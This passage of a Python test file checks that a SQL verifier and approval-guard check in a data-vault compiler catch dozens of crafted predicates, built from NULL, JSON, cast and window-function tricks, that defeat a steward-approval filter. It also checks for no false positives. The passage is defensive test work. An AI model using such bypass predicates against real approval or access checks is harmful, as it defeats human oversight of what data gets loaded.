            "(SELECT MAX('ok') OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) "
            "FROM (SELECT 1) AS w)",
        ),
    )
    for _, ctrl_expr in valid_controls:
        assert ddb.execute(f"SELECT {ctrl_expr} FROM staging.s AS s").fetchone() is not None, (
            ctrl_expr
        )
    ddb.close()

    all_vectors: list[tuple[str, str]] = [("duckdb_local", p) for p in live_preds] + [
        ("sqlserver_fabric", "CONVERT(VARCHAR, CASE WHEN s.id = 2 THEN NULL ELSE TRUE END) = ALL(SELECT x FROM staging.empty_t)"),
    ]
    for tid, pred in all_vectors:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred[:80]
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred[:80])
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, tid)
        ), (tid, pred[:80])
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    portable_preds = (
        "CAST(CASE WHEN s.id = 2 THEN NULL ELSE TRUE END AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(NULLIF(TRUE, TRUE) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "UPPER(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "LOWER(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "TRIM(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "ABS(NULL) = ALL(SELECT 1 WHERE FALSE)",
        "LENGTH(NULL) = ALL(SELECT 1 WHERE FALSE)",
        "REPLACE(NULL, 'a', 'b') = ALL(SELECT x FROM staging.empty_t)",
        "ROUND(NULL, 2) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(UPPER('a'), 'A') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST('1' AS INT), 1) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(CAST(1 AS DOUBLE), 1.0) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT MAX('ok') FILTER (WHERE FALSE) OVER () FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT FIRST_VALUE('ok') OVER (ROWS BETWEEN 1 FOLLOWING AND 2 FOLLOWING) FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
    )
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for pred in portable_preds:
            u_sql = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
            )
            try:
                ast = sqlglot.parse_one(u_sql, read=dialect)
            except Exception:
                continue
            assert has_steward_approved_guard(ast) is False, (tid, pred)
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, pred)

    cast_true = sqlglot.parse_one("CAST(TRUE AS VARCHAR)", read="duckdb")
    assert is_bool_or_null_expr(cast_true, allow_null=True) is False
    cast_mixed = sqlglot.parse_one(
        "CAST(CASE WHEN s.id = 2 THEN NULL ELSE TRUE END AS VARCHAR)", read="duckdb",
    )
    assert is_bool_or_null_expr(cast_mixed, allow_null=True) is True
    assert is_bool_or_null_expr(cast_mixed, allow_null=False) is False

    for ok_tid, ok_expr in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} = ANY(s.arr)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)



    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter37_r4_concat_ws_json_case_cast_window_map_scalar_and_range() -> None:
    """Remediate all 8 converged r4 findings with 0 FPs across controls and 80/80 bundles."""
    import duckdb

    from opendv.storage._bool_expr_const import eval_const_lit
    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    assert eval_const_lit(sqlglot.parse_one("CONCAT_WS(',', 'a', NULL, 'b')", read="duckdb")) == "a,b"
    assert eval_const_lit(sqlglot.parse_one("CONCAT_WS(NULL, 'a', 'b')", read="duckdb")) is None

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[], m MAP(VARCHAR, VARCHAR))"
    )
    ddb.execute(
        "INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'], MAP {'a': 'ok'})"
    )
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")

    live_preds = (
        # 1. ConcatWs subclass ordering
        "NULLIF(CONCAT_WS(',', 'a', NULL, 'b'), 'a,b') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CONCAT_WS('-', 'a', 'b'), 'a-b') = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN CONCAT_WS(NULL, 'a', 'b') IS NULL THEN NULL ELSE 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN CONCAT_WS('-', 'a', 'b') = 'a-b' THEN NULL ELSE 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        # 2. Case-sensitive JSON object keys & JSON paths
        "JSON_EXTRACT_STRING('{\"A\": \"ok\"}', '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT('{\"A\": \"ok\"}', '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "('{\"A\": \"ok\"}'::JSON->>'a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_ARRAY_LENGTH('{\"A\": [1, 2]}', '$.a') = ALL(SELECT 1::UBIGINT WHERE FALSE)",
        "JSON_TYPE('{\"A\": 1}', '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_KEYS('{\"A\": 1}', '$.a') = ALL(SELECT ['a'] WHERE FALSE)",
        "JSON_EXTRACT_STRING('{\"a\": \"ok\"}', '$.A') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT_STRING(JSON_OBJECT('A', 'ok'), '$.a') = ALL(SELECT x FROM staging.empty_t)",
        # 3. CAST / TRY_CAST null propagation & integer bit-width bounds
        "CAST(NULL AND (s.id = 2) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST((s.id = 2) AND NULL AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(NULL OR (s.id = 1) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(s.id IN (1, NULL) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(s.id IN (SELECT NULL) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(s.id BETWEEN 1 AND NULL AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(LIST_CONTAINS(NULL::INT[], 1) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(ARRAY_CONTAINS(NULL::INT[], 1) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(REGEXP_MATCHES(NULL, 'a') AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(ISNAN(NULL::DOUBLE) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "TRY_CAST('99999999999999999999999' AS INT) = ALL(SELECT 1 WHERE FALSE)",
        "TRY_CAST('200' AS TINYINT) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(CAST('99999999999999999999999' AS INT)) = ALL(SELECT 1 WHERE FALSE)",
        "TRY_STRPTIME('bad', '%Y') = ALL(SELECT TIMESTAMP '2020-01-01' WHERE FALSE)",
        # 4. Named WINDOW, window/1-row aggregates, direct container NULL calls
        "(SELECT MAX('ok') OVER w FROM (SELECT 1) AS t WINDOW w AS (ROWS BETWEEN 1 FOLLOWING AND 2 FOLLOWING)) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT MAX('ok') OVER w2 FROM (SELECT 1) AS t WINDOW w1 AS (PARTITION BY 1), w2 AS (w1 ROWS BETWEEN 1 FOLLOWING AND 2 FOLLOWING)) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT MAX('ok') OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW EXCLUDE CURRENT ROW) FROM (SELECT 1) AS t) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT MAX('ok') OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW EXCLUDE GROUP) FROM (SELECT 1) AS t) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT STDDEV(1) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT VARIANCE(1) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT SKEWNESS(1) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT KURTOSIS(1) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT SUM(NULL::INT) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT AVG(NULL::INT) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT QUANTILE(NULL::INT, 0.5) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT MAX_BY(NULL::VARCHAR, 1) OVER () FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT STRING_AGG(NULL::VARCHAR, ',') OVER () FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT CAST(BOOL_AND(NULL::BOOLEAN) OVER () AS VARCHAR) FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT STDDEV(1) FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT VARIANCE(1) FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "MAP_FROM_ENTRIES(NULL::STRUCT(k VARCHAR, v VARCHAR)[]) = ALL(SELECT MAP {'a': 'b'} WHERE FALSE)",
        "MAP(NULL::VARCHAR[], NULL::VARCHAR[]) = ALL(SELECT MAP {'a': 'b'} WHERE FALSE)",
        "RANGE(1, 5, NULL) = ALL(SELECT [1] WHERE FALSE)",
        "GENERATE_SERIES(1, 5, NULL) = ALL(SELECT [1] WHERE FALSE)",
        # 5. MAP ELEMENT_AT & MAP_FROM_ENTRIES Bracket -1 shift
        "ELEMENT_AT(MAP {'a': 'ok'}, 'b')[1] = ALL(SELECT x FROM staging.empty_t)",
        "ELEMENT_AT(MAP {'a': 'ok'}, 'A')[1] = ALL(SELECT x FROM staging.empty_t)",
        "MAP_FROM_ENTRIES([(1, 'ok')])[2] = ALL(SELECT x FROM staging.empty_t)",
        "MAP_FROM_ENTRIES([{'k': 1, 'v': 'ok'}])[2] = ALL(SELECT x FROM staging.empty_t)",
        # 6. JSON_KEYS non-object & OOB index
        "JSON_KEYS('[1, 2]') = ALL(SELECT ['a'] WHERE FALSE)",
        "JSON_KEYS('{\"a\": 1}', '$.a') = ALL(SELECT ['a'] WHERE FALSE)",
        "JSON_KEYS('{\"a\": 1}', '$')[2] = ALL(SELECT x FROM staging.empty_t)",
        # 7. NULL_STRICT_SCALAR_FUNCS, typed date/extract AST nodes, & scalar folding
        "EXTRACT(YEAR FROM CAST(NULL AS DATE)) = ALL(SELECT 1::BIGINT WHERE FALSE)",
        "DATE_PART('year', CAST(NULL AS DATE)) = ALL(SELECT 1::BIGINT WHERE FALSE)",
        "YEAR(CAST(NULL AS DATE)) = ALL(SELECT 1::BIGINT WHERE FALSE)",
        "MONTH(CAST(NULL AS DATE)) = ALL(SELECT 1::BIGINT WHERE FALSE)",
        "DAY(CAST(NULL AS DATE)) = ALL(SELECT 1::BIGINT WHERE FALSE)",
        "EPOCH(CAST(NULL AS TIMESTAMP)) = ALL(SELECT 1.0 WHERE FALSE)",
        "DATE_DIFF('day', CAST(NULL AS DATE), DATE '2026-01-01') = ALL(SELECT 1 WHERE FALSE)",
        "DATEDIFF('day', CAST(NULL AS DATE), DATE '2026-01-01') = ALL(SELECT 1 WHERE FALSE)",
        "DATE_ADD(CAST(NULL AS DATE), INTERVAL 1 DAY) = ALL(SELECT DATE '2026-01-01' WHERE FALSE)",
        "DATE_SUB('day', CAST(NULL AS DATE), DATE '2026-01-01') = ALL(SELECT 1 WHERE FALSE)",
        "REGEXP_EXTRACT(NULL, 'a') = ALL(SELECT x FROM staging.empty_t)",
        "MAKE_DATE(NULL::INT, 1, 1) = ALL(SELECT DATE '2020-01-01' WHERE FALSE)",
        "STR_SPLIT(NULL, ',') = ALL(SELECT ['a'] WHERE FALSE)",
        "STRING_SPLIT(NULL, ',') = ALL(SELECT ['a'] WHERE FALSE)",
        "URL_ENCODE(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "BASE64(NULL::BLOB) = ALL(SELECT x FROM staging.empty_t)",
        "SIN(NULL::DOUBLE) = ALL(SELECT 1.0::DOUBLE WHERE FALSE)",
        "COS(NULL::DOUBLE) = ALL(SELECT 1.0::DOUBLE WHERE FALSE)",
        "TAN(NULL::DOUBLE) = ALL(SELECT 1.0::DOUBLE WHERE FALSE)",
        "TO_JSON(NULL) = ALL(SELECT CAST('1' AS JSON) WHERE FALSE)",
        "NULLIF(ABS(-1), 1) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(ROUND(1.2), 1) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(FLOOR(1.9), 1) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(CEIL(1.1), 2) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(REVERSE('ab'), 'ba') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(SUBSTR('abc', 0, 2), 'a') = ALL(SELECT x FROM staging.empty_t)",
        # 8. RANGE(>64) OOB still blocked
        "RANGE(1, 100)[101] = ALL(SELECT 1 WHERE FALSE)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    valid_controls = (
        ("duckdb_local", "TRY_CAST(TRUE AS VARCHAR)", "TRY_CAST(TRUE AS VARCHAR) = ANY(s.arr)"),
        ("duckdb_local", "JSON_EXTRACT_STRING('{\"a\": \"ok\"}', '$.a')", "JSON_EXTRACT_STRING('{\"a\": \"ok\"}', '$.a') = ANY(s.arr)"),
        ("duckdb_local", "JSON_EXTRACT_STRING(JSON_OBJECT('A', 'ok'), '$.A')", "JSON_EXTRACT_STRING(JSON_OBJECT('A', 'ok'), '$.A') = ANY(s.arr)"),
        ("duckdb_local", "MAP_FROM_ENTRIES([(1, 'ok')])[1]", "MAP_FROM_ENTRIES([(1, 'ok')])[1] = ANY(s.arr)"),
        ("duckdb_local", "JSON_KEYS('{\"a\": 1}')", "JSON_KEYS('{\"a\": 1}') = ANY(ARRAY[['a']])"),
        ("duckdb_local", "JSON_KEYS('{\"a\": 1}', '$')[1]", "JSON_KEYS('{\"a\": 1}', '$')[1] = ANY(s.arr)"),
        ("duckdb_local", "ELEMENT_AT(MAP {'a': 'ok'}, 'a')[1]", "ELEMENT_AT(MAP {'a': 'ok'}, 'a')[1] = ANY(s.arr)"),
        ("duckdb_local", "RANGE(1, 100)[1]", "RANGE(1, 100)[1] = ANY(ARRAY[1])"),
        ("duckdb_local", "RANGE(0, 100, 1)[50]", "RANGE(0, 100, 1)[50] = ANY(ARRAY[49])"),
        ("duckdb_local", "(SELECT MAX('ok') OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW EXCLUDE TIES) FROM (SELECT 1) AS t)", "(SELECT MAX('ok') OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW EXCLUDE TIES) FROM (SELECT 1) AS t) = ANY(s.arr)"),
        ("duckdb_local", "(SELECT MAX('ok') OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW EXCLUDE NO OTHERS) FROM (SELECT 1) AS t)", "(SELECT MAX('ok') OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW EXCLUDE NO OTHERS) FROM (SELECT 1) AS t) = ANY(s.arr)"),
        ("duckdb_local", "(SELECT ROW_NUMBER() OVER () FROM (SELECT 1) AS t)", "(SELECT ROW_NUMBER() OVER () FROM (SELECT 1) AS t) = ANY(ARRAY[1])"),
        ("duckdb_local", "(SELECT RANK() OVER () FROM (SELECT 1) AS t)", "(SELECT RANK() OVER () FROM (SELECT 1) AS t) = ANY(ARRAY[1])"),
        ("duckdb_local", "(SELECT DENSE_RANK() OVER () FROM (SELECT 1) AS t)", "(SELECT DENSE_RANK() OVER () FROM (SELECT 1) AS t) = ANY(ARRAY[1])"),
        ("duckdb_local", "(SELECT COUNT(*) OVER () FROM (SELECT 1) AS t)", "(SELECT COUNT(*) OVER () FROM (SELECT 1) AS t) = ANY(ARRAY[1])"),
        ("duckdb_local", "CAST(LIST_CONTAINS([1], 1) AS VARCHAR)", "CAST(LIST_CONTAINS([1], 1) AS VARCHAR) = ANY(ARRAY['true'])"),
        ("duckdb_local", "CAST(FALSE AND NULL AS VARCHAR)", "CAST(FALSE AND NULL AS VARCHAR) = ANY(ARRAY['false'])"),
        ("duckdb_local", "CAST(TRUE OR NULL AS VARCHAR)", "CAST(TRUE OR NULL AS VARCHAR) = ANY(ARRAY['true'])"),
        ("duckdb_local", "EXTRACT(YEAR FROM DATE '2026-01-01')", "EXTRACT(YEAR FROM DATE '2026-01-01') = ANY(ARRAY[2026])"),
        ("duckdb_local", "REGEXP_EXTRACT('abc', 'a')", "REGEXP_EXTRACT('abc', 'a') = ANY(ARRAY['a'])"),
    )
    for _, ctrl_expr, _ in valid_controls:
        assert ddb.execute(f"SELECT {ctrl_expr} FROM staging.s AS s").fetchone()[0] is not None, (
            ctrl_expr
        )
    ddb.close()

    for tid, pred in [("duckdb_local", p) for p in live_preds]:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, pred
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), pred
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, tid)
        ), pred
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    portable_preds = (
        "NULLIF(CONCAT_WS(',', 'a', NULL, 'b'), 'a,b') = ALL(SELECT x FROM staging.empty_t)",
        "CAST(NULL AND (s.id = 2) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(s.id IN (1, NULL) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT MAX('ok') OVER w FROM (SELECT 1) AS t WINDOW w AS (ROWS BETWEEN 1 FOLLOWING AND 2 FOLLOWING)) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT STDDEV(1) OVER () FROM (SELECT 1) AS w) = ALL(SELECT 1.0 WHERE FALSE)",
        "EXTRACT(YEAR FROM CAST(NULL AS DATE)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(ABS(-1), 1) = ALL(SELECT 1 WHERE FALSE)",
    )
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for pred in portable_preds:
            u_sql = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
            )
            try:
                ast = sqlglot.parse_one(u_sql, read=dialect)
            except Exception:
                continue
            assert has_steward_approved_guard(ast) is False, (tid, pred)
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, pred)

    assert is_bool_or_null_expr(sqlglot.parse_one("TRY_CAST(TRUE AS VARCHAR)", read="duckdb")) is False

    for ok_tid, _, ok_pred in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, ok_pred
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], ok_pred
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], ok_pred

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter38_r5_json_escape_any_all_safe_withingroup_aggs_and_nullif() -> None:
    """Remediate all 6 converged r5 items with 0 FPs across controls and 80/80 bundles."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[], m MAP(VARCHAR, VARCHAR))"
    )
    ddb.execute(
        "INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'], MAP {'a': 'ok'})"
    )
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")

    live_preds = (
        # 1. Nested JSON_EXTRACT case sensitivity
        "JSON_EXTRACT(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A'), '$.b') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT_STRING(JSON_EXTRACT('{\"outer\": {\"A\": \"ok\"}}', '$.outer'), '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A')->>'b') = ALL(SELECT x FROM staging.empty_t)",
        # 2. JSON_KEYS on non-literal expressions
        "JSON_KEYS(TO_JSON([1, 2]))[1] = ALL(SELECT x FROM staging.empty_t)",
        "JSON_KEYS(JSON_OBJECT('a', 1))[2] = ALL(SELECT x FROM staging.empty_t)",
        "JSON_KEYS(CASE WHEN s.id = 2 THEN '[1, 2]' ELSE '{\"a\": 1}' END)[1] = ALL(SELECT x FROM staging.empty_t)",
        # 3. exp.Escape, exp.Any, exp.All, Anonymous("ALL") under ab=False
        "('a' LIKE 'a' ESCAPE NULL) = ALL(SELECT TRUE WHERE FALSE)",
        "('a' ILIKE 'a' ESCAPE NULL) = ALL(SELECT TRUE WHERE FALSE)",
        "CAST('a' LIKE 'a' ESCAPE NULL AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST('a' ILIKE 'a' ESCAPE NULL AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(2 = ANY(SELECT NULL::INT) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(1 = ALL(SELECT x FROM (VALUES (1), (NULL::INT)) AS t(x)) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(2 = ANY([1, NULL]) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(2 = ALL([2, NULL]) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(NOT (2 = ANY(SELECT NULL::INT)) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        # 4. TRY_CAST 32-bit FLOAT/REAL overflow
        "TRY_CAST(1e40 AS FLOAT) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "TRY_CAST(-1e40 AS REAL) = ALL(SELECT 1.0::REAL WHERE FALSE)",
        # 5. WithinGroup ORDER BY NULL & DuckDB catalog aggregates
        "(SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY NULL::INT) FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY NULL::INT) FROM (SELECT 1) AS t) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT COVAR_POP(NULL::DOUBLE, 1.0) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT MAD(NULL::DOUBLE) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT FAVG(NULL::DOUBLE) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT FSUM(NULL::DOUBLE) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT KAHAN_SUM(NULL::DOUBLE) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT SUMKAHAN(NULL::DOUBLE) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT SUM_NO_OVERFLOW(NULL::INT) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT ARG_MAX_NULL(NULL::VARCHAR, 1) OVER () FROM (SELECT 1) AS t) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT ARG_MAX_NULLS_LAST(NULL::VARCHAR, 1) OVER () FROM (SELECT 1) AS t) = ALL(SELECT x FROM staging.empty_t)",
